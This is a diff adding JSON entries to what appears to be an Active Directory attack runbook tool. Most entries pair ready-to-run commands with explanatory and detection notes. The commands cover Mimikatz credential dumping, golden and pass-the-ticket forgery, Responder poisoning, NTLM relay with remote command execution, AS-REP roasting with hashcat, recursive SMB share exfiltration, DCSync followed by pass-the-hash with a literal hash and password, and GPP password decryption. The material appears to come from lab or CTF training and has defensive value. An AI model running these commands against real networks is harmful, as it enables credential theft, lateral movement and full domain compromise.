+    "hasGraph": true
+  },
+  {
+    "id": "7720eb10-1f05-4f70-b080-c539dc0ff5e0",
+    "label": "Mimikatz LSASS/SAM Dump",
+    "command": "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::lsa /patch ",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> is a classic post-exploitation tool for extracting credentials from Windows memory and local security stores. In this runbook, <code>privilege::debug</code> is used to request the privileges needed to interact with protected processes, <code>sekurlsa::logonpasswords</code> targets LSASS memory for plaintext and hash material, and <code>lsadump::sam</code> or <code>lsadump::lsa /patch</code> target local SAM and LSA-backed secrets. Together, these commands can reveal reusable credentials for local accounts, domain users, and service principals on the compromised host.</p>\n<ol><li><strong>How attack works:</strong> The attacker launches Mimikatz and enables the required local privileges.</li><li><strong>How attack works:</strong> LSASS memory is queried for live credential material and logon secrets.</li><li><strong>How attack works:</strong> Local SAM and LSA-backed secrets are dumped for offline reuse or cracking.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> is available from the <a href=\"https://github.com/gentilkiwi/mimikatz\">Mimikatz project</a>.</li><li><strong>Attack pre-requesite:</strong> Code execution on the Windows host plus enough privilege to access LSASS or protected local security data, typically administrative or SYSTEM-level context.</li><li><strong>What attacker gains:</strong> Plaintext passwords, NTLM hashes, Kerberos material, and local secret data from the compromised system.</li><li><strong>Detection/Defense opsec:</strong> Protect LSASS with Credential Guard where possible, restrict debug privilege, monitor for known Mimikatz command patterns, and alert on abnormal LSASS access.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "tool:mimikatz",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "5b52889d-d3f6-41d0-b924-d80c1f83eb28",
+    "label": "Golden Ticket Forgery",
+    "command": "lsadump::lsa /inject /name:krbtgt\nkerberos::golden /User:Administrator /domain:marvel.local /sid:S1-15-21…. /krbtgt:af… /id:500 /ptt\nmisc::cmd\nthis opens a new CMD with golden ticket,\nthen inside, you can full control of other machines for instance\ndir \\\\THEPUNISHER\\c$\nwill list C file of remote machine THEPUNISHER,\nyou can also download psexec and use it on this cmd to get shell",
+    "description": "<p>A Golden Ticket attack uses the domain's <strong>krbtgt</strong> secret and domain SID to forge a Ticket Granting Ticket (TGT) offline. With <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span>, an attacker who has already obtained the <code>krbtgt</code> hash can mint a TGT for an arbitrary user identity, inject it into the current session with <code>/ptt</code>, and then request service tickets for privileged access across the domain. Because the ticket is signed with the same secret the KDC trusts, this technique can create durable domain persistence until the <code>krbtgt</code> password is rotated twice.</p>\n<ol><li><strong>How attack works:</strong> The attacker obtains the <code>krbtgt</code> hash and domain SID from prior compromise.</li><li><strong>How attack works:</strong> Mimikatz forges a TGT offline for an attacker-chosen user and injects it into the current logon session.</li><li><strong>How attack works:</strong> The forged ticket is presented to the KDC and used to obtain access to protected resources across the domain.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> is available from the <a href=\"https://github.com/gentilkiwi/mimikatz\">Mimikatz project</a>.</li><li><strong>Attack pre-requesite:</strong> Possession of the domain SID and the <code>krbtgt</code> password hash, usually after Domain Admin-level compromise or DCSync-style credential theft.</li><li><strong>What attacker gains:</strong> Forged Kerberos TGTs that can grant broad, durable access across the domain.</li><li><strong>Detection/Defense opsec:</strong> Monitor for impossible Kerberos ticket characteristics, unusual TGT lifetimes, suspicious privileged Kerberos activity, and rotate the <code>krbtgt</code> secret twice after compromise.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:persist",
+      "phase:exploit",
+      "tool:mimikatz",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "fb791f76-d4c0-4458-9028-992c01248f4b",
+    "label": "LLMNR Poisoning (Responder)",
+    "command": "sudo responder -I eth2 -dwv \n# ensure SMB enabled \n#then on victim, go in file folder to \\\\attacker_ip , you get ntlm hashes on attacker\nhashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Responder</span> can poison name-resolution fallback traffic such as LLMNR and NBNS to convince Windows hosts that the attacker is the server they were trying to reach. When a victim mistypes a UNC path or requests a nonexistent hostname, the attacker replies faster than the legitimate environment and prompts the victim to authenticate to the rogue service. The resulting NTLM challenge-response data can then be cracked offline with <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> or relayed to another target if conditions allow.</p>\n<ol><li><strong>How attack works:</strong> The attacker starts Responder on the local subnet.</li><li><strong>How attack works:</strong> A victim fails normal name resolution and broadcasts an LLMNR/NBNS query.</li><li><strong>How attack works:</strong> Responder poisons the reply path, captures NTLM authentication, and the hash can be cracked offline.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Responder</span> is available from the <a href=\"https://github.com/lgandx/Responder\">Responder project</a>, and <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> can crack the captured NTLMv2 material offline.</li><li><strong>Attack pre-requesite:</strong> Presence on the victim subnet and a victim action that causes a fallback broadcast for name resolution.</li><li><strong>What attacker gains:</strong> Captured NTLMv2 challenge-response material that may reveal usable credentials after cracking or relay.</li><li><strong>Detection/Defense opsec:</strong> Disable LLMNR/NBNS where possible, enforce SMB signing, monitor rogue responder behavior, and alert on outbound authentication to unexpected hosts.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:responder",
+      "tool:hashcat",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "1d6a10a0-ae5e-4005-8037-c840128065de",
+    "label": "SMB Relay (ntlmrelayx)",
+    "command": "# 1. Recon & Setup: Check SMB signing and config proxychains\nnmap --script=smb2-security-mode.nse -p445 10.0.2.73\necho 10.0.2.73 > targets.txt\nsudo sed -i 's/9050/1080/g' /etc/proxychains4.conf\n\n# 2. Attack Execution (Choose one method below)\n\n# Option A: SOCKS Tunneling (For manual tool usage)\nimpacket-ntlmrelayx -tf targets.txt -smb2support -socks\n# (In new terminal) proxychains impacket-secretsdump -no-pass DOMAIN/USER@10.0.2.73\n\n# Option B: Automated Hash Dumping (SAM/LSA)\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Option C: RCE (Command or Payload)\nimpacket-ntlmrelayx -tf targets.txt -smb2support -c \"whoami /all\"\n# impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n\n# Option D: Interactive File System\nimpacket-ntlmrelayx -tf targets.txt -smb2support -i\n# (In new terminal) nc 127.0.0.1 11000",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>ntlmrelayx</code> relays an intercepted NTLM authentication attempt from one victim to another target that does not enforce protections such as SMB signing. Instead of cracking a password, the attacker forwards the live challenge-response exchange to a chosen server and abuses the authenticated context immediately for actions such as dumping SAM data, opening SOCKS pivoting, or executing remote operations. The technique is most powerful when combined with a coercion source or poisoned name-resolution path that produces inbound NTLM traffic on demand.</p>\n<ol><li><strong>How attack works:</strong> The attacker configures <code>ntlmrelayx</code> with a target list and waits for inbound NTLM authentication.</li><li><strong>How attack works:</strong> A victim authenticates to the attacker due to coercion or a poisoned network path.</li><li><strong>How attack works:</strong> The live NTLM exchange is relayed to a vulnerable SMB target and post-authentication actions run in the victim's context.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> is available from the <a href=\"https://github.com/fortra/impacket\">Impacket project</a>, and <code>ntlmrelayx</code> is one of its core relay tools.</li><li><strong>Attack pre-requesite:</strong> An inbound NTLM authentication source and a relay target that does not enforce the protections that would block SMB relay.</li><li><strong>What attacker gains:</strong> Post-authentication access to the relay target using the victim's live NTLM session, often enough to dump hashes or execute follow-on actions.</li><li><strong>Detection/Defense opsec:</strong> Enforce SMB signing, reduce coercion paths, monitor inbound NTLM to unusual hosts, and alert on relay-like authentication patterns and suspicious ntlmrelayx behavior.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "9a508a02-2579-4533-b3d1-d64249d3d799",
+    "label": "enum4linux SMB Enumeration",
+    "command": "# Basic verbose enumeration (Run All options) against a target\n# -a : Do all simple enumeration (-U -S -G -P -r -o -n -i)\nenum4linux -a <TARGET_IP>\n\n# Enumeration with known credentials (Authenticated Scan)\n# -u : Username\n# -p : Password\nenum4linux -u <USER> -p <PASSWORD> -a <TARGET_IP>\n\n# Specific User Enumeration via RID Cycling (Useful to find valid usernames)\n# -r : RID cycle\nenum4linux -r <TARGET_IP>",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#enum4linux</span> is a wrapper around common Samba tools such as <code>rpcclient</code>, <code>smbclient</code>, <code>net</code>, and <code>nmblookup</code> that automates information gathering from Windows and Samba systems. Depending on configuration, it can enumerate users, groups, shares, password policy, RID cycling results, and other SMB/RPC-exposed data with anonymous or authenticated access. This makes it a fast first-pass recon utility for identifying identity and share information on Windows targets before deeper exploitation.</p>\n<ol><li><strong>How attack works:</strong> The attacker launches <span style=\"color:#ef4444;font-weight:bold;\">#enum4linux</span> against a target host.</li><li><strong>How attack works:</strong> The tool queries multiple SMB/RPC interfaces to enumerate users, groups, shares, and policy information.</li><li><strong>How attack works:</strong> Returned data is consolidated into a reconnaissance profile of the target system.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#enum4linux</span> is commonly available on Kali Linux and other offensive-security distributions.</li><li><strong>Attack pre-requesite:</strong> Network reachability to the target over <span style=\"color:#3b82f6;\">SMB/RPC (TCP 445 and related services)</span>. Depending on the environment, enumeration may work anonymously or require credentials.</li><li><strong>What attacker gains:</strong> User, group, share, RID, and policy data that supports target profiling and later access attempts.</li><li><strong>Detection/Defense opsec:</strong> Monitor anonymous or unusual SMB/RPC enumeration, restrict null-session exposure, and harden share and RPC access on servers.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:enum4linux"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "5b2613f0-edfc-4e27-bbe7-c075c6dd6b5b",
+    "label": "Kerbrute AD Enumeration",
+    "command": "# Basic Kerberos username enumeration\n# Syntax: ./kerbrute userenum --dc <DC_IP> -d <DOMAIN> <WORDLIST>\n\n# Note: Ensure you have the correct IP for the Domain Controller to avoid timeout errors\n./kerbrute_linux_amd64 userenum \\\n  --dc 10.80.158.159 \\\n  -d spookysec.local \\\n  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n\n# Pro-Tip: If you want to check a specific list of passwords against a known user list later:\n# ./kerbrute_linux_amd64 passwordspray -d spookysec.local valid_users.txt \"Password123!\"",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Kerbrute</span> is a fast Kerberos-focused enumeration tool that can validate whether usernames exist in Active Directory by observing how the KDC responds to raw authentication requests. In user-enumeration mode it sends AS-REQ traffic without needing a password and distinguishes valid from invalid accounts based on KDC error codes such as <code>PREAUTH_REQUIRED</code> or <code>PRINCIPAL_UNKNOWN</code>. This makes it a useful low-noise way to build a list of valid domain identities before password spraying or Kerberos roasting.</p>\n<ol><li><strong>How attack works:</strong> The attacker launches Kerbrute in user-enumeration mode with a candidate username list.</li><li><strong>How attack works:</strong> The tool rapidly sends Kerberos requests to the Domain Controller.</li><li><strong>How attack works:</strong> Response codes are parsed to separate valid accounts from nonexistent ones.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Kerbrute</span> is distributed by the <a href=\"https://github.com/ropnop/kerbrute\">Kerbrute project</a>.</li><li><strong>Attack pre-requesite:</strong> Network reachability to the Domain Controller over <span style=\"color:#3b82f6;\">Kerberos (UDP/TCP 88)</span> and a list of candidate usernames.</li><li><strong>What attacker gains:</strong> A validated list of existing AD usernames for follow-on credential attacks.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual bursts of Kerberos requests from non-admin hosts, rate-limit or alert on username-enumeration patterns, and protect user lists where possible.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:kerbrute"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "de17c0ad-2b3c-4b48-93ba-638fdeb87f20",
+    "label": "AS-REP Roasting (GetNPUsers)",
+    "command": "# Step 1: Request the TGT hash for a specific user (or use -usersfile for a list)\n# Note: -request flag is mandatory to retrieve the hash. -no-pass prevents a password prompt.\nimpacket-GetNPUsers spookysec.local/username -dc-ip 10.80.167.130 -request -no-pass -format hashcat -outputfile attractive-kerb-hash.txt\n\n# Step 2: Crack the captured hash offline\n# Mode 18200 = Kerberos 5, etype 23, AS-REP\nhashcat -m 18200 attractive-kerb-hash.txt /usr/share/wordlists/rockyou.txt --force",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>GetNPUsers</code> performs AS-REP Roasting by requesting Kerberos authentication data for users whose accounts have preauthentication disabled. For those misconfigured accounts, the KDC returns an AS-REP encrypted with the user's secret, and the attacker can save that blob in a format suitable for offline cracking with <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span>. Unlike password spraying, the attack does not need a valid password guess and can succeed with only a valid username list.</p>\n<ol><li><strong>How attack works:</strong> The attacker requests AS-REP data for a target user or list of usernames without providing a password.</li><li><strong>How attack works:</strong> The KDC returns crackable AS-REP material for accounts that do not require preauthentication.</li><li><strong>How attack works:</strong> Hashcat attacks the saved material offline to recover plaintext passwords.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> supplies <code>GetNPUsers</code>, and <span style=\"color:#ef4444;font-weight:bold;\">#Hashcat</span> supports offline cracking of the resulting AS-REP material.</li><li><strong>Attack pre-requesite:</strong> A valid username or user list plus a misconfigured account with Kerberos preauthentication disabled.</li><li><strong>What attacker gains:</strong> Crackable AS-REP material and potentially plaintext passwords for the targeted users.</li><li><strong>Detection/Defense opsec:</strong> Disable preauthentication exceptions where possible, monitor unusual AS-REQ activity for roastable users, and alert on cracking-friendly AS-REP retrieval patterns.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "tool:hashcat",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "e0ea97ee-22da-4c45-82f2-3b245812d0a6",
+    "label": "SMB Data Exfiltration (smbclient)",
+    "command": "smbclient \\\\\\\\attacktivedirectory\\\\SYSVOL -U spookysec.local/svc-admin management2005\n\n\nsmb: \\> prompt off    # Disable confirmation prompts for mget\nsmb: \\> recurse on    # Enable directory recursion\nsmb: \\> mget * # Download everything from current directory recursively",
+    "description": "<p><code>smbclient</code> is a command-line SMB/CIFS client that can browse and download files from accessible network shares using valid credentials. In this runbook, the attacker authenticates to a share such as <code>SYSVOL</code>, disables interactive prompts, enables recursive traversal, and performs a bulk <code>mget</code> to pull data from the share. This is a straightforward collection and exfiltration pattern once credentials have already been compromised and the attacker has identified a share containing interesting files.</p>\n<ol><li><strong>How attack works:</strong> The attacker authenticates to a remote SMB share with valid credentials.</li><li><strong>How attack works:</strong> Interactive safeguards are disabled so the client can recurse and download files in bulk.</li><li><strong>How attack works:</strong> Share contents are copied to the attacker system for offline review or further abuse.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <code>smbclient</code> is part of the Samba suite and is widely available on Linux systems such as Kali.</li><li><strong>Attack pre-requesite:</strong> Valid credentials and network reachability to the target share over <span style=\"color:#3b82f6;\">SMB (TCP 445)</span>.</li><li><strong>What attacker gains:</strong> Bulk access to files stored on remote SMB shares, including policy data and sensitive documents.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual recursive share downloads, protect high-value shares with least privilege, and alert on large authenticated SMB read volumes from unexpected hosts.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "platform:linux",
+      "shell:cmd",
+      "phase:exploit",
+      "domain:ad",
+      "tool:smbclient"
+    ],
+    "color": "#ec4899",
+    "hasGraph": true
+  },
+  {
+    "id": "d5944e51-7ce4-4bef-beaf-029c043b1127",
+    "label": "DCSync to Pass-The-Hash",
+    "command": "impacket-secretsdump spookysec.local/backup:backup2517860@attacktivedirectory\n\nevil-winrm -i attacktivedirectory -u administrator -H 0e0363213e37b94221497260b0bcb4fc\n\n#replace attacktivedirectory with your AD or machine IP",
+    "description": "<p>This runbook chains a DCSync operation with a direct pass-the-hash login. First, <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> <code>secretsdump</code> abuses directory replication rights to recover domain credential material from the Domain Controller. The operator then selects a useful NTLM hash and uses it directly with <code>evil-winrm</code> to authenticate to a target system without ever knowing the plaintext password. This turns replication privilege on one domain asset into immediate lateral access on another host.</p>\n<ol><li><strong>How attack works:</strong> The attacker performs a DCSync-style dump with <code>secretsdump</code> to recover NTLM hashes.</li><li><strong>How attack works:</strong> A privileged hash is selected from the returned domain credential material.</li><li><strong>How attack works:</strong> The chosen hash is reused directly for a remote WinRM login to the next target.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> provides <code>secretsdump</code>, and <code>evil-winrm</code> supports hash-based WinRM authentication from Linux attackers.</li><li><strong>Attack pre-requesite:</strong> Replication-capable credentials for DCSync and network reachability to the follow-on target over <span style=\"color:#3b82f6;\">WinRM (TCP 5985/5986)</span>.</li><li><strong>What attacker gains:</strong> Domain NTLM hashes plus direct lateral access to another host without needing plaintext credentials.</li><li><strong>Detection/Defense opsec:</strong> Audit replication rights, monitor DCSync behavior from non-DC systems, and alert on WinRM logons that use reused admin material immediately after credential-dumping activity.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "tool:impacket",
+      "phase:exploit",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "82f195ac-1f2f-4bb3-991c-f951875af9c1",
+    "label": "Pass-The-Ticket (Mimikatz)",
+    "command": "# 1. Start Mimikatz with admin rights\n#mimikatz.exe\n\n# 2. Enable debug privileges to interact with LSASS\nprivilege::debug\n\n# 3. Export all Kerberos tickets from memory to current directory as .kirbi files\nsekurlsa::tickets /export\n\n# 4. Inject the stolen ticket into the current session\n# Replace the filename with the specific one exported in step 3\nkerberos::ptt \"[0;2a9c8a]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi\"\n\n# 5. Exit Mimikatz\nexit\n\n# 6. Verify the ticket is loaded in the current command prompt session\nklist\n\n# 7. Access the Domain Controller share using the injected ticket\ndir \\\\CONTROLLER.LOCAL\\C$",
+    "description": "<p>Pass-the-Ticket reuses an already-stolen Kerberos ticket instead of stealing or cracking a password. With <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span>, an attacker can export cached tickets from memory as <code>.kirbi</code> files and later inject one of those tickets into the current logon session with <code>kerberos::ptt</code>. Once injected, Windows transparently uses the ticket when accessing network resources, allowing the attacker to impersonate the ticket's owner for Kerberos-authenticated actions.</p>\n<ol><li><strong>How attack works:</strong> Cached Kerberos tickets are exported from memory to disk as <code>.kirbi</code> files.</li><li><strong>How attack works:</strong> A selected ticket is injected into the current logon session.</li><li><strong>How attack works:</strong> The injected ticket is used to access Kerberos-protected resources as the stolen identity.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> provides both ticket export and <code>kerberos::ptt</code> injection functionality.</li><li><strong>Attack pre-requesite:</strong> Access to a cached Kerberos ticket and the ability to run Mimikatz on a compromised Windows host.</li><li><strong>What attacker gains:</strong> Kerberos-authenticated access as the ticket's owner without needing the corresponding password.</li><li><strong>Detection/Defense opsec:</strong> Monitor ticket export and injection behavior, protect LSASS access, and investigate resource access that does not match a normal interactive logon path for the user.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "tool:mimikatz",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "456dbbec-d9c1-491c-b27f-3e9c9ca1b39f",
+    "label": "Basic AD Enum (PowerView)",
+    "command": "PS> Import-Module .\\PowerView.ps1\nPS> Get-NetDomain\nPS> Get-NetUser | select cn,pwdlastset,lastlogon\nPS> Get-NetGroup | select cn\nPS> Get-NetGroup \"Sales Department\" | select member\nPS> Get-NetComputer ",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> provides a compact set of PowerShell functions for broad Active Directory reconnaissance using native .NET and LDAP access. This runbook chains common starter queries such as <code>Get-NetDomain</code>, <code>Get-NetUser</code>, <code>Get-NetGroup</code>, and <code>Get-NetComputer</code> to build a baseline picture of the domain structure, user population, group layout, and computer inventory. It is a useful general-purpose recon pass before narrower tasks like SPN discovery, ACL hunting, or privilege-path mapping.</p>\n<ol><li><strong>How attack works:</strong> The attacker loads PowerView into the current PowerShell session.</li><li><strong>How attack works:</strong> Multiple LDAP-backed enumeration cmdlets query domain, user, group, and computer data.</li><li><strong>How attack works:</strong> The results are combined into a general Active Directory reconnaissance snapshot.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> A domain-aware PowerShell session with ordinary read access to Active Directory.</li><li><strong>What attacker gains:</strong> High-level visibility into domain identity, group, and computer structure using a single imported toolkit.</li><li><strong>Detection/Defense opsec:</strong> Monitor PowerShell logging for PowerView imports and broad LDAP enumeration from endpoints that do not normally perform directory administration.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:powerview"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "2aa149a4-1299-4a9a-a633-5dae8a264356",
+    "label": "Session Enum (wkssvc)",
+    "command": "PS> .\\PsLoggedon.exe \\\\files04",
+    "description": "<p>This runbook uses <code>PsLoggedon.exe</code> to identify which users are logged on to a remote Windows host. Tools in this category query remote workstation or session-related interfaces to determine where users are active, which helps an attacker prioritize systems likely to hold valuable tokens, profiles, or administrative activity. In practice, remote session discovery is useful for spotting where administrators are currently working so the attacker can target those systems for credential theft or token abuse.</p>\n<ol><li><strong>How attack works:</strong> The attacker launches <code>PsLoggedon.exe</code> against a remote host.</li><li><strong>How attack works:</strong> The tool queries remote session-related information to identify logged-on users.</li><li><strong>How attack works:</strong> The resulting identity map is used to prioritize lateral movement and credential-access targets.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <code>PsLoggedon.exe</code> is part of the Sysinternals toolset from Microsoft.</li><li><strong>Attack pre-requesite:</strong> Network reachability to the remote host and sufficient rights for the underlying remote session query to succeed.</li><li><strong>What attacker gains:</strong> Visibility into which users are active on a remote endpoint, including potentially high-value administrators.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual remote session-enumeration activity and administrative-query tooling being run from compromised workstations.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:psloggedon"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "d143e8ca-c7be-418c-ac20-e1e274f7bf0b",
+    "label": "Native SPN Discovery (setspn)",
+    "command": "setspn -L iis_service",
+    "description": "<p><code>setspn.exe</code> is a native Microsoft utility that can list and query Service Principal Names registered in Active Directory. By using it against a service account or broader query scope, an attacker can identify accounts tied to Kerberos-enabled services and distinguish potential Kerberoasting targets from ordinary user objects. Because it is a signed built-in tool and often used legitimately by administrators, it is also a low-friction way to perform SPN discovery when PowerView or Rubeus are unavailable.</p>\n<ol><li><strong>How attack works:</strong> The attacker runs <code>setspn.exe</code> to inspect SPNs registered for a service account or search scope.</li><li><strong>How attack works:</strong> Active Directory returns the SPN attributes associated with the target account(s).</li><li><strong>How attack works:</strong> The attacker reviews the list to identify service accounts worth targeting for Kerberoasting or service abuse.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <code>setspn.exe</code> is a native Microsoft command-line utility available on Windows systems with the relevant administration components.</li><li><strong>Attack pre-requesite:</strong> A domain-aware Windows shell and the ability to query directory-backed SPN data.</li><li><strong>What attacker gains:</strong> A list of SPNs and associated accounts, helping isolate Kerberos service principals of interest.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual use of <code>setspn.exe</code> from workstations and correlate it with other AD reconnaissance or Kerberoasting preparation.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:setspn"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "1b5f5630-387a-4ce2-a861-43d4e04358a3",
+    "label": "SPN Discovery (PowerView)",
+    "command": "PS> Get-NetUser -SPN | select samaccountname,serviceprincipalname",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> can enumerate SPN-bearing user accounts directly from Active Directory with <code>Get-NetUser -SPN</code>. This approach is often more targeted than broad native enumeration because it filters specifically for user objects with populated SPN attributes, immediately surfacing accounts that are likely to be useful Kerberoasting targets. The result is a cleaner attacker view of service-linked identities without needing to manually sift through non-relevant directory objects.</p>\n<ol><li><strong>How attack works:</strong> The attacker loads PowerView into the current PowerShell session.</li><li><strong>How attack works:</strong> A targeted LDAP query requests user objects that have SPNs.</li><li><strong>How attack works:</strong> The returned service accounts are reviewed as Kerberoasting candidates.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> A domain-aware PowerShell session with normal read access to Active Directory.</li><li><strong>What attacker gains:</strong> A targeted list of SPN-bearing user accounts for Kerberos-focused follow-on attacks.</li><li><strong>Detection/Defense opsec:</strong> Watch for PowerView imports and LDAP filters focused on servicePrincipalName-bearing accounts.</li></ul>",
+    "tags": [
+      "phase:recon",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:powerview"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "1f9b9cef-b2a7-4bf7-b77e-6bb6e2c4ae03",
+    "label": "ACL Enum (PowerView)",
+    "command": "PS>  Get-ObjectAcl -Identity stephanie\n\nPS>  Get-ObjectAcl -Identity \"Management Department\" | ?\n{$_.ActiveDirectoryRights -eq \"GenericAll\"} | select\nSecurityIdentifier,ActiveDirectoryRights\n\nPS C:\\Tools> \"S-1-5-21-1987370270-658905905-1781884369-512\",\"S-1-5-21-1987370270-\n658905905-1781884369-1104\",\"S-1-5-32-548\",\"S-1-5-18\",\"S-1-5-21-1987370270-658905905-\n1781884369-519\" | Convert-SidToName\n\n",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> can query and resolve Active Directory access control entries with <code>Get-ObjectAcl</code>. This reveals which users or groups hold rights such as <code>GenericAll</code>, <code>GenericWrite</code>, or other delegated permissions over specific AD objects. From an attacker perspective, ACL enumeration is critical because overly permissive entries can expose direct privilege-escalation paths even when traditional group membership looks unremarkable.</p>\n<ol><li><strong>How attack works:</strong> The attacker queries the security descriptor of a target AD object with PowerView.</li><li><strong>How attack works:</strong> Returned ACEs are resolved from raw identifiers and GUIDs into human-readable permissions.</li><li><strong>How attack works:</strong> The attacker identifies dangerous delegated rights that can be abused later.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> A domain-aware PowerShell session with read access to the target object's security descriptor.</li><li><strong>What attacker gains:</strong> Visibility into ACL-based privilege paths and delegated rights on users, groups, and other AD objects.</li><li><strong>Detection/Defense opsec:</strong> Monitor large-scale ACL enumeration from endpoints and audit delegated rights such as <code>GenericAll</code> or <code>WriteDACL</code> on sensitive objects.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "d6196133-7adc-49a5-90ee-a9b95d3db2c2",
+    "label": "Share Discovery (Invoke-ShareFinder)",
+    "command": "PS> Find-DomainShare\nPS> ls \\\\dc1.corp.com\\sysvol\\corp.com\\\nPS> cat \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\oldpolicy\\old-policy-backup.xml\nPS> gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\"",
